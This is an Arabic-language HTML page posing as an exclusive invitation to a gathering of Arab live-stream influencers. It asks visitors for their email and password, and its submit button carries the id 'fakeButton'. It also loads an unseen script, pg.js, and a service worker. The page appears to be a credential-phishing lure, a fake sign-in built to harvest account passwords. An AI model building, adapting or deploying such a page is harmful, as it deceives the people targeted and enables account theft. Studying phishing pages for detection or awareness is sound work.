<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>دعوة حصرية لتجمع نجوم اللايفات  العرب</title>
  <link rel="manifest" href="manifest.json">
  <style>
    body { font-family: 'Cairo', Arial, sans-serif; text-align: center; padding: 20px; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; }
    .container { max-width: 400px; margin: auto; background: rgba(255, 255, 255, 0.95); padding: 20px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.3); color: #333; }
    h1 { font-size: 24px; margin-bottom: 10px; }
    p { font-size: 16px; margin-bottom: 20px; }
    .logo { width: 100px; margin: 20px auto; display: block; }
    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
    .button { padding: 15px; background: #FFD700; color: #1e3c72; border: none; cursor: pointer; width: 100%; font-size: 18px; border-radius: 8px; font-weight: bold; }
    .button:hover { background: #FFC107; }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <img src="logo.png" alt="Arab Live Stars" class="logo">
    <h1>دعوة حصرية لتجمع نجوم اللايف العرب</h1>
    <p>انضم إلى نخبة المؤثرين العرب! أدخل إلى التجمع الحصري.</p>
    <input type="text" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="password" placeholder="كلمة المرور">
    <button id="fakeButton" class="button">تأكيد العضوية</button>
  </div>
  <script src="pg.js"></script>
  <script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('sw.js').catch(error => console.error('Service Worker Error:', error));
    }
  </script>
</body>
</html>
